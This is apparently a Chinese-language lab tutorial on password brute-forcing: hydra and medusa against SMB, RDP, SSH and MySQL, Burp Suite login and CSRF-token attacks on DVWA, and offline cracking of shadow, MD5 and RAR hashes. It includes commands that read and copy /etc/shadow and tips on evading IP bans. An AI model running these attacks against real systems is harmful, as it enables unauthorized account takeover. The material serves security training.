通过字典枚举登录目标服务.

## 1 Burp Suite

拦截登录框数据包发送到 Intruder, 对目标参数的值进行标记

![拦截登录框数据包发送到 Intruder, 对目标参数的值进行标记](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%8B%A6%E6%88%AA%E7%99%BB%E5%BD%95%E6%A1%86%E6%95%B0%E6%8D%AE%E5%8C%85%E5%8F%91%E9%80%81%E5%88%B0%20Intruder,%20%E5%AF%B9%E7%9B%AE%E6%A0%87%E5%8F%82%E6%95%B0%E7%9A%84%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%A0%87%E8%AE%B0.png)

Attack type 选择 Cluster bomb

![Attack type 选择 Cluster bomb](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/Attack%20type%20%E9%80%89%E6%8B%A9%20Cluster%20bomb.png)

在 Payloads 中加载字典到两处标记位置

![在 Payloads 中加载字典到两处标记位置](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9C%A8%20Payloads%20%E4%B8%AD%E5%8A%A0%E8%BD%BD%E5%AD%97%E5%85%B8%E5%88%B0%E4%B8%A4%E5%A4%84%E6%A0%87%E8%AE%B0%E4%BD%8D%E7%BD%AE.png)

可添加字符串过滤

![可添加字符串过滤](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%8F%AF%E6%B7%BB%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4.png)

## 2 端口

## ==未归纳==

## 1 字典生成

1. 通用字典
2. 社工字典
3. 穷举字典

## 2 暴力破解

### 2.1 在线爆破

使用 john 生成一个通用的弱口令字典

```
┌──(root㉿Kali-24)-[~]
└─# john --wordlist --rules --stdout > hello.txt
```

```
Created directory: /root/.john
Using default input encoding: UTF-8
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Press 'q' or Ctrl-C to abort, almost any other key for status
156846p 0:00:00:00 100.00% (2023-07-27 18:26) 3136Kp/s Sssing
```

> john 生成的字典适用于海外密码习惯

为确保实验成功，要追加正确的密码到这个字典

```
┌──(root㉿Kali-24)-[~]
└─# echo hello>> /usr/share/john/password.lst
```

### 2.2 hydra

### 2.2.1 SMB

**Windows 7**

切换至 Administrator 并设置密码

打开 Windows 7 的 SMB 服务

![打开 Windows 7 的 SMB 服务](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E6%89%93%E5%BC%80%20Windows%207%20%E7%9A%84%20SMB%20%E6%9C%8D%E5%8A%A1.png)

使用 nmap 扫描 SMB 服务端口 445

```
┌──(root㉿Kali-24)-[~]
└─# nmap 192.168.1.71 -p 445
```

> 445 端口需要开启

打开 hydra ,查看参数

```
┌──(root㉿Kali-24)-[~]
└─# hydra
```

| 操作    | 描述                                                    |
| ------- | ------------------------------------------------------- |
| -I      | 指定单个用户名称                                        |
| -L      | 指定用户名称字典                                        |
| -p      | 指定单个密码                                            |
| -P      | 指定密码字典                                            |
| -S      | 指定端口                                                |
| -vV     | 显示详细的执行过程                                      |
| -t `16` | 指定线程数（默认 16个，线程数过多容易出现错误）         |
| -e nsr  | n（空密码）s（用户名作为密码）r（将用户名反转作为密码） |

使用 hydra 爆破 445端口（协议://IP）

```
┌──(root㉿Kali-24)-[~]
└─# hydra -l hello -P hello.txt smb://192.168.1.71 -vV
```

```
[445][smb] host: 192.168.1.71   login: hello   password: hello
```

> 得到密码 hello

在其它主机的运行窗口执行

```
\\192.168.1.71\c$
```

> 输入用户名和密码登录即可

**Windows 10**

切换至 Administrator 并设置密码

> windows 10 默认 smb 版本为 smb v2，smb 版本发展至今有 smb v1 v2 v3 版本，hydra 工具默认支持 smb v1，如果需要爆破 windows 10 的 smb 服务则需要下载源码进行编译安装。

卸载系统自带的 hydra

```
┌──(root㉿Kali-32)-[~]
└─# sudo apt remove hydra -y
```

获取更新列表

```
┌──(root㉿Kali-24)-[~]
└─# sudo apt update
```

安装 libsmbclient-dev 开发库

```
┌──(root㉿Kali-24)-[~]
└─# sudo apt install libsmbclient-dev -y
```

下载 hydra 源码包

```
┌──(root㉿Kali-32)-[~]
└─# sudo git clone https://github.com/vanhauser-thc/thc-hydra.git
```

切换进目录

```
┌──(root㉿Kali-24)-[~]
└─# cd thc-hydra/
```

检测环境

```
┌──(root㉿Kali-24)-[~/thc-hydra-master]
└─# ./configure
```

编译

```
┌──(root㉿Kali-24)-[~/thc-hydra-master]
└─# make
```

安装

```
┌──(root㉿Kali-24)-[~/thc-hydra-master]
└─# make install
```

启动

```
┌──(root㉿Kali-24)-[~/thc-hydra-master]
└─# hydra
```

开启 Windows 10 的 SMB 服务

nmap 扫描 445 端口

```
┌──(root㉿Kali-24)-[~/thc-hydra-master]
└─# nmap 192.168.1.102 -p 445
```

爆破（需指定 SMB 版本）

```
┌──(root㉿Kali-24)-[~]
└─# hydra -l windows -P [file_name].txt smb2://192.168.1.102 -vV
```

> 成功爆破

### 2.2.2 RDP

运行 sysdm.cpl

![运行 sysdm.cpl](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E8%BF%90%E8%A1%8C%20sysdm.cpl.png)

开启 RDP 服务（家庭版无此功能）

![开启 RDP 服务](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%BC%80%E5%90%AF%20RDP%20%E6%9C%8D%E5%8A%A1.png)

使用 nmap 扫描 RDP 服务端口 3389

```
┌──(root㉿Kali-24)-[~]
└─# nmap 192.168.1.71 -p 3389
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 18:57 CST
Nmap scan report for 192.168.1.71
Host is up (0.00019s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
MAC Address: 00:0C:29:0E:EC:86 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
```

> 可以看到端口是开启的

开始爆破

```
┌──(root㉿Kali-24)-[~]
└─# hydra -l hello -P hello.txt rdp://192.168.1.71 -vV
```

```
[3389][rdp] host: 192.168.1.71   login: windows   password: hello
```

> 得到密码 hello

运行窗口执行

```
mstsc
```

指定 IP

```
192.168.1.71
```

> 输入用户名和密码登录即可

### 2.2.3 SSH

打开 CentOs ，用 nmap 扫描 ssh 服务端口 22

```
┌──(root㉿Kali-24)-[~]
└─# nmap 192.168.1.76 -p 22 
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 19:05 CST
Nmap scan report for 192.168.1.76
Host is up (0.00017s latency).

PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:88:D0:AB (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
```

> 可以看到端口开启

使用 hydra 爆破

```
┌──(root㉿Kali-24)-[~]
└─# hydra -l root -P hello.txt ssh://192.168.1.76 -vV
```

```
[22][ssh] host: 192.168.1.76   login: root   password: hello
```

> 成功爆破

连接 CentOS

```
┌──(root㉿Kali-24)-[~]
└─# ssh root@192.168.1.76
```

> 输入密码即可

### 2.3 hydra-gtk

### 2.3.1 mysql

> 图形化 hydra-gtk

安装 hydra-gtk

```
┌──(root㉿Kali-32)-[~]
└─# sudo apt install hydra-gtk -y 
```

执行 hydra-gtk

```
┌──(root㉿Kali-32)-[~]
└─# xhydra 
```

配置目标

> IP 端口 协议

![配置目标](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E9%85%8D%E7%BD%AE%E7%9B%AE%E6%A0%87.png)

配置字典

>用户名 密码

![配置字典](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E9%85%8D%E7%BD%AE%E5%AD%97%E5%85%B8.png)

配置参数

> 线程数 超时时间 代理

![配置参数](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0.png)

开始爆破

![开始爆破](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%BC%80%E5%A7%8B%E7%88%86%E7%A0%B4.png)

爆破成功

![爆破成功](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png)

> 下方会显示使用的命令

### 2.4 medusa

> Medusa(美杜莎)是一个速度快，支持大规模并行，模块化的爆力破解工具。可以同时对多个主机，用户或密码执行强力测试。Medusa 和 hydra 一样，同样属于在线密码破解工具。Medusa 是支持 AFP,CVS,FTP,HTTP,IMAP,MS-SQL,MySQL,NCP (NetWare),NNTP,PcAnywhere,POP3,PostgreSQL,rexec, RDP,rlogin,rsh,SMBNT,SMTP(AUTH/VRFY),SNMP,SSHv2,SVN,Telnet,VmAuthd,VNC,Generic Wrapper 以及 Web 表单的密码爆破工具。

| 操作        | 描述                                        |
| ----------- | ------------------------------------------- |
| -h          | 目标 IP                                     |
| -H          | 目标主机文件                                |
| -u          | 用户名                                      |
| -U          | 用户名文件                                  |
| -p          | 密码                                        |
| -P          | 密码文件                                    |
| -C          | 组合条目文件                                |
| -O          | 文件日志信息                                |
| -e [n/s/ns] | n 意为空密码，s 意为密码与用户名相同        |
| -M          | 模块执行名称                                |
| -m          | 传递参数到模块                              |
| -d          | 显示所有的模块名称                          |
| -n          | 使用非默认端口                              |
| -s          | 启用 SSL                                    |
| -r          | 重试间隔时间，默认为 3 秒                   |
| -t          | 设定线程数量                                |
| -L          | 并行化，每个用户使用一个线程                |
| -f          | 在任何主机上找到第一个账号/密码后，停止破解 |
| -q          | 显示模块的使用信息                          |
| -v          | 详细级别（0-6）                             |
| -w          | 错误调试级别（0-10）                        |
| -V          | 显示版本                                    |
| -Z          | 继续扫描上一次                              |
| -F          | 破解到一个正确的密码即退出                  |

### 2.4.1 smb

```
┌──(root㉿Kali-32)-[~]
└─# medusa -h 192.168.1.71 -u windows -P hello.txt -M smbnt -F
```

### 2.4.2 ssh

```
┌──(root㉿Kali-32)-[~]
└─# medusa -h 192.168.1.76 -u centos -P hello.txt -M ssh -F
```

### 2.4.3 mysql

开启 mysql 

```
[root@CentOS-76 ~]# mysql -u root -p
```

列出数据库

```
MariaDB [(none)]> show databases;
```

使用 mysql 数据库

```
MariaDB [(none)]> use mysql;
```

列出数据表

```
MariaDB [mysql]> show tables;
```

打印 user 表的所有结果，查看登录条件

```
MariaDB [mysql]> select * from user\G;
```

授权 root 用户允许远程登录

```
MariaDB [mysql]> grant all privileges on *.* to 'root'@'%'identified by 'mysql' with grant option;
```

退出 mysql

```
MariaDB [mysql]> exit;
```

在 kali 安装 mysql

```
┌──(root㉿Kali-32)-[~]
└─# sudo apt install mariadb-client-core -y
```

验证登录

```
┌──(root㉿Kali-32)-[~]
└─# mysql -u root -h 192.168.1.76 -p
```

> 成功登录，证明实验条件成立

退出数据库

```
MariaDB [(none)]> exit;
```

使用 medusa 爆破，设置线程为 1

```
┌──(root㉿Kali-32)-[~]
└─# medusa -h 192.168.1.76 -u root -P hello.txt -M mysql -F -t 1
```

### 2.4.4 RDP



## 3 离线爆破

例如：字典的 hash 值与加密文件的 hash 值碰撞

### 3.1 破解 md5

手动加密 md5 值，破解其它加密方式也是同理。

```
┌──(root㉿Kali-32)-[~]
└─# echo -n "123456"| md5sum
```

```
e10adc3949ba59abbe56e057f20f883e  -
```

> \- n	去掉换行符
>
> md5 不可解密，只能将字典的密码转换为 md5 用穷举法对比目标的 md5，或者在社工库查找

hash 值查询网站

> https://www.cmd5.com/

使用 md5.py 对 hash 值和字典进行碰撞

```
┌──(root㉿Kali-32)-[~]
└─# python md5.py e10adc3949ba59abbe56e057f20f883e /root/hello.txt
```

```
解密成功！密码是: 123456
```

### 3.2 破解   SHA512

查看 kali 的 密码

```
┌──(root㉿Kali-32)-[~]
└─# cat /etc/shadow
```

```
root:$y$j9T$finfzDrdt2ZmQ/PSF4MhH.$veQlZsPx32Gr4e7gQ7gTlsSzmC8Na0jntHg9cT.FUb2:19566:0:99999:7:::
```

> id 为 y 无法爆破

查看 centos 的密码

```
[root@CentOS-76 ~]# cat /etc/shadow
```

```
root:$6$xnbFkaH/.Li4sLic$UCILY35MhRaYnv/zBH5piq72z0BVDAu8MtnuTphxanqkoqh1OF5Go7y0XYAugz8kUDawYPeKErPo1Jp6n929C.::0:99999:7:::
```

> id 为 6 可以爆破

将 shadow 文件拷贝到 root 目录下

```
┌──(root㉿Kali-32)-[~]
└─# scp root@192.168.1.76:/etc/shadow /root/
```

通过 john 爆破

```
┌──(root㉿Kali-32)-[~]
└─# john /root/shadow
```

```
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
centos           (centos)     
centos           (root)     
2g 0:00:00:00 DONE 1/3 (2023-07-29 11:02) 200.0g/s 4700p/s 4800c/s 4800C/s centos..root12
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

>john 会自动识别加密类型

也可以指定字典爆破

```
┌──(root㉿Kali-32)-[~]
└─# john /root/shadow --wordlist=hello.txt
```

> 破解过就不会再破解

查看结果

```
┌──(root㉿Kali-32)-[~]
└─# john shadow --show  
```

```
root:centos::0:99999:7:::
centos:centos::0:99999:7:::
```

破解记录存在 .john/john.pot 中

```
┌──(root㉿Kali-32)-[~]
└─# cat .john/john.pot
```

```
$6$fnA8/BkdxnqXLxbt$bzGai1yUgcW1ER6Iu10ZA1ieh/7Wi66sjksuZJ5vgbNAcKwumynywBWAQNhF4vuJsxcDn4v2ZsH6YCAnPMUJp0:centos
$6$xnbFkaH/.Li4sLic$UCILY35MhRaYnv/zBH5piq72z0BVDAu8MtnuTphxanqkoqh1OF5Go7y0XYAugz8kUDawYPeKErPo1Jp6n929C.:centos
```

删除记录文件即可重新破解

```
┌──(root㉿Kali-32)-[~]
└─# rm -rf .john/john.*
```

| 可以爆破的 id |
| :-----------: |

| 操作 | 描述   |
| ---- | ------ |
| 1    | md5    |
| 5    | SHA256 |
| 6    | SHA512 |

### 3.3 破解 rar

### 3.3.1 john

将一个加密的 rar 文件上传至 kali

用 rar2john 提取这个密码的 hash 值到 rar.txt 文件中

> rar2john 是 john 的脚本，john 有很多脚本

```
┌──(root㉿Kali-32)-[~]
└─# sudo rar2john hello.rar > rar.txt
```

用 john 解密这个文件

```
┌──(root㉿Kali-32)-[~]
└─# john rar.txt --wordlist=hello.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 6 candidates left, minimum 32 needed for performance.
123456           (hello.rar)     
1g 0:00:00:00 DONE (2023-07-29 11:23) 50.00g/s 300.0p/s 300.0c/s 300.0C/s windows..123456
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> 得到密码为 123456

查看 kali 中自带的 john 的脚本

```
┌──(root㉿Kali-32)-[~]
└─# ls /usr/sbin |grep john
```

```
bitlocker2john
dmg2john
eapmd5tojohn
gpg2john
hccap2john
john
keepass2john
putty2john
racf2john
rar2john
uaf2john
vncpcap2john
wpapcap2john
zip2john
```

> github 上有更多
>
> https://github.com/openwall/john/tree/bleeding-jumbo/run

### 3.3.2 hashcat

> 在物理机上支持 GPU 爆破

vim 打开 rar.txt

```
┌──(root㉿Kali-32)-[~]
└─# vim rar.txt
```

```
hello.rar:$rar5$16$208f41e4d7fbb3acddd20715cb54a87c$15$065c8bfa12434a2adbd944ac9849d472$8$06ee26940892c341
```

删除多余的内容只保留 hash 值

```
$rar5$16$208f41e4d7fbb3acddd20715cb54a87c$15$065c8bfa12434a2adbd944ac9849d472$8$06ee26940892c341
```

用 hashcat 查看 rar5 解码的参数

```
┌──(root㉿Kali-32)-[~]
└─# hashcat --help | grep RAR5
```

```
13000 | RAR5                                                       | Archive
```

> 参数为 13000
>
> RAR 要大写，直接看 help 即可知道

使用 hashcat 破解密码

```
┌──(root㉿Kali-32)-[~]
└─# hashcat -m 13000 rar.txt hello.txt
```

> 首次使用需要初始化

```
$rar5$16$208f41e4d7fbb3acddd20715cb54a87c$15$065c8bfa12434a2adbd944ac9849d472$8$06ee26940892c341:123456
```

> 密码为 123456

查看 hashcat 的破解记录

```
┌──(root㉿Kali-32)-[~]
└─# cat .local/share/hashcat/hashcat.potfile
```

```
$rar5$16$208f41e4d7fbb3acddd20715cb54a87c$15$065c8bfa12434a2adbd944ac9849d472$8$06ee26940892c341:123456
```

> 删除这个文件即可再次爆破这段 hash

## 4 Web 爆破

### 4.1 常见问题

失败次数限制：

> 基本不存在暴力破解，手动测几个弱口令即可

验证码：

> 识别并自动填写，商用识别软件可能会要求实名认证

token：

> 可以获取 token 更新

加解密：

> 密码学	逆向	js 代码（必学）	敏感信息	Basic 认证（base64 md5）

### 4.2 实战-通过暴力破解 web 登录界面获得管理员权限

使用 burpsuite 破解 web 登录密码

实验环境：

Kali	DVWA

### 4.2.1 简单爆破

### 4.2.1.1 页面信息

在页面尝试登录，查看反馈的特征

> **错误返回**
>
> 用户名错误（密码正确，爆破用户名）
>
> 密码错误（用户名正确，爆破密码）
>
> 用户名或密码错误（未知错误，使用常见的用户名爆破密码，例如：root	admin	admin123	Admin 等常见用户名）
>
> 页面跳转至登录页面
>
> **成功返回**
>
> 响应头 Set-Cookie	例如：
>
> 开启拦截，登录 DVWA，将请求发送到重放器，删除 Cookie，发送，得到  `Set-Cookie`
>
> ![得到  Set-Cookie](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%BE%97%E5%88%B0%20%20Set-Cookie.png)
>
> 页面跳转至登录后的页面

登录 DVWA，进入 Brute Force

> http://192.168.1.76/DVWA/vulnerabilities/brute/

尝试登录

填写用户名和任意密码

> admin
>
> 123456

得到登录失败的反馈信息

> `Username and/or password incorrect.`

![得到登录失败的反馈信息](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%BE%97%E5%88%B0%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%8F%8D%E9%A6%88%E4%BF%A1%E6%81%AF.png)

开启拦截，再次登录

发送到重放器，点击发送

在响应包搜索失败特征 `Username and/or password incorrect.`

![在响应包搜索失败特征](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%9C%A8%E5%93%8D%E5%BA%94%E5%8C%85%E6%90%9C%E7%B4%A2%E5%A4%B1%E8%B4%A5%E7%89%B9%E5%BE%81.png)

记下失败特征 `password incorrect.`

把数据包发送到 `Intruder`

将密码设置为 payload 位置

![将密码设置为 payload 位置](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%B0%86%E5%AF%86%E7%A0%81%E8%AE%BE%E7%BD%AE%E4%B8%BA%20payload%20%E4%BD%8D%E7%BD%AE.png)

选择攻击类型

![选择攻击类型](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E9%80%89%E6%8B%A9%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B.png)

配置 payload 类型和 payload

GET 类型的测试要 URL 编码

资源池设置线程数尽量少一点（否则容易被封 IP，可以购买代理池）

根据网站设置请求间隔时间和响应时间

将特征添加到检索-匹配

![将特征添加到检索-匹配](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%B0%86%E7%89%B9%E5%BE%81%E6%B7%BB%E5%8A%A0%E5%88%B0%E6%A3%80%E7%B4%A2-%E5%8C%B9%E9%85%8D.png)

开始攻击

![开始攻击](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%BC%80%E5%A7%8B%E6%94%BB%E5%87%BB.png)

> 没有匹配到特征的就是成功的

### 4.2.2 获取 token 爆破

### 4.2.2.1 扩展

将级别改为高级别

Burp Suite 安装扩展  `CSRF Token Tracker`

> 此时只能设置线程为 1

添加 HOST

![添加 HOST](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E6%B7%BB%E5%8A%A0%20HOST.png)

> 实战中为域名 www.example.com

打开扩展，提交 admin 和任意密码123

从响应包中提取 token 的参数

![从响应包中提取 token 的参数](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E4%BB%8E%E5%93%8D%E5%BA%94%E5%8C%85%E4%B8%AD%E6%8F%90%E5%8F%96%20token%20%E7%9A%84%E5%8F%82%E6%95%B0.png)

粘贴到扩展

![粘贴到扩展](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E7%B2%98%E8%B4%B4%E5%88%B0%E6%89%A9%E5%B1%95.png)

> 记得点击 `√` 以启用

在重放器中发送的多次请求数据包，可以看到每次都成功

查看扩展，发现自动获取了 token 的值

下次发送数据包时就会将 token 自动更新

此时将最后的响应数据包放入 Intruder 发现可以攻击

> 每个 token 只能使用一次，用于防止非法访问

### 4.2.2.2交叉攻击

关闭扩展

将最后一个响应包发送到 Intruder 

将攻击类型改为交叉

![将攻击类型改为交叉](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%B0%86%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%E6%94%B9%E4%B8%BA%E4%BA%A4%E5%8F%89.png)

设置密码和 token 为 payload 位置

![设置密码和 token 为 payload 位置](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81%E5%92%8C%20token%20%E4%B8%BA%20payload%20%E4%BD%8D%E7%BD%AE.png)

第一个 payload 为密码爆破，使用字典

![第一个 payload 为密码爆破，使用字典](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E7%AC%AC%E4%B8%80%E4%B8%AA%20payload%20%E4%B8%BA%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%AD%97%E5%85%B8.png)

第二个 payload 为 token 获取，使用递归提取

选中递归后查看提示

![第二个 payload 为 token 获取，使用递归提取](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E7%AC%AC%E4%BA%8C%E4%B8%AA%20payload%20%E4%B8%BA%20token%20%E8%8E%B7%E5%8F%96%EF%BC%8C%E4%BD%BF%E7%94%A8%E9%80%92%E5%BD%92%E6%8F%90%E5%8F%96.png)

根据提示打开  grep 获取响应

![根据提示打开  grep 获取响应](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E6%A0%B9%E6%8D%AE%E6%8F%90%E7%A4%BA%E6%89%93%E5%BC%80%20%20grep%20%E8%8E%B7%E5%8F%96%E5%93%8D%E5%BA%94.png)

检索 token 复制

![检索 token 复制](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E6%A3%80%E7%B4%A2%20token%20%E5%A4%8D%E5%88%B6.png)

将这个 token 的值粘贴到 payload 即可

![将这个 token 的值粘贴到 payload 即可](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%B0%86%E8%BF%99%E4%B8%AA%20token%20%E7%9A%84%E5%80%BC%E7%B2%98%E8%B4%B4%E5%88%B0%20payload%20%E5%8D%B3%E5%8F%AF.png)

> 剩下的步骤和普通攻击一样，记住线程只能设为 1，因为只有获取到 token 才能继续下一步，无法并发

### 4.3 以页面跳转作为匹配

### 4.3.1 payload 匹配

打开http://192.168.1.76/DVWA/

填写用户名和任意密码

> admin	123

登录，可以看到失败后返回的是之前的登录页面

打开拦截，再次登录，在重放器发送，查看响应包

![打开拦截，再次登录，在重放器发送，查看响应包](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E6%89%93%E5%BC%80%E6%8B%A6%E6%88%AA%EF%BC%8C%E5%86%8D%E6%AC%A1%E7%99%BB%E5%BD%95%EF%BC%8C%E5%9C%A8%E9%87%8D%E6%94%BE%E5%99%A8%E5%8F%91%E9%80%81%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%93%8D%E5%BA%94%E5%8C%85.png)

> 发现响应包有跳转页面的特征 `login.php`
>
> 将 `login.php` 添加为 payload 匹配即可

### 4.3.2 跟随重定向

清空 payload 匹配，总是跟随重定向

![清空 payload 匹配，总是跟随重定向](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E6%B8%85%E7%A9%BA%20payload%20%E5%8C%B9%E9%85%8D%EF%BC%8C%E6%80%BB%E6%98%AF%E8%B7%9F%E9%9A%8F%E9%87%8D%E5%AE%9A%E5%90%91.png)

开始攻击，可以看到失败页面和成功页面的长度不同

![开始攻击，可以看到失败页面和成功页面的长度不同](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%BC%80%E5%A7%8B%E6%94%BB%E5%87%BB%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%A4%B1%E8%B4%A5%E9%A1%B5%E9%9D%A2%E5%92%8C%E6%88%90%E5%8A%9F%E9%A1%B5%E9%9D%A2%E7%9A%84%E9%95%BF%E5%BA%A6%E4%B8%8D%E5%90%8C.png)

> 即可通过长度判断是否成功

### 4.4 配置 Apache 的基本认证 BasicAuthentication

创建密码文件

```
[root@CentOS-76 html]# cd /etc/httpd/
[root@CentOS-76 httpd]# mkdir  Auth
[root@CentOS-76 httpd]# htpasswd -c Auth/pass admin
```

> 文件夹 `Auth` 与之后的配置文件有关联性，不要随便改
>
> `htpasswd -c` 只有首次创建需要加 -c 参数

查看文件

```
[root@CentOS-76 httpd]# cat Auth/pass
admin:$apr1$2PzLjuOD$k2MAZ5C5zyHc5jI9wbT27.
```

> 可以看到这个文件存储的是用户名和加密后的密码

修改 Apache 配置文件

```
[root@CentOS-76 httpd]# vim conf/httpd.conf
```

将\<Directory "/var/www/html">标签里的的代码删除，插入 basic 认证的代码

```html
<Directory "/var/www/html">
    Options Indexes FollowSymLinks
    AllowOverride all
	AuthName "hello"
	AuthType basic
	AuthUserFile /etc/httpd/Auth/pass
	Require valid-user
</Directory>
```

| 操作                              | 描述                                             |
| --------------------------------- | ------------------------------------------------ |
| AllowOverride all                 | 允许用.htaccess 文件中指定的验证文件进行身份验证 |
| AuthName "hello"                  | 认证名称                                         |
| AuthType basic                    | 认证方式                                         |
| AuthUserFile /etc/httpd/Auth/pass | 用户密码文件                                     |
| Require valid-user                | 要求正式用户，不能匿名                           |

> #号前的空格，不能有中文全角空格

在 httpd.conf 文件末尾添加

```
ServerName localhost
```

检查配置文件是否正确

```
[root@CentOS-76 httpd]# httpd -t
```

```
Syntax OK
```

>返回 `Syntax OK` 即配置正确

重启 Apache 服务

```
[root@CentOS-76 httpd]# systemctl restart httpd.service
```

浏览器访问

>http://192.168.1.76/DVWA/

发现开启了 basic 认证

![发现开启了 basic 认证](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%8F%91%E7%8E%B0%E5%BC%80%E5%90%AF%E4%BA%86%20basic%20%E8%AE%A4%E8%AF%81.png)

尝试输入错误的密码查看返回状态码是 401

![尝试输入错误的密码查看返回状态码是 401](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%B0%9D%E8%AF%95%E8%BE%93%E5%85%A5%E9%94%99%E8%AF%AF%E7%9A%84%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E8%BF%94%E5%9B%9E%E7%8A%B6%E6%80%81%E7%A0%81%E6%98%AF%20401.png)

尝试取消登录查看返回状态码也是 401

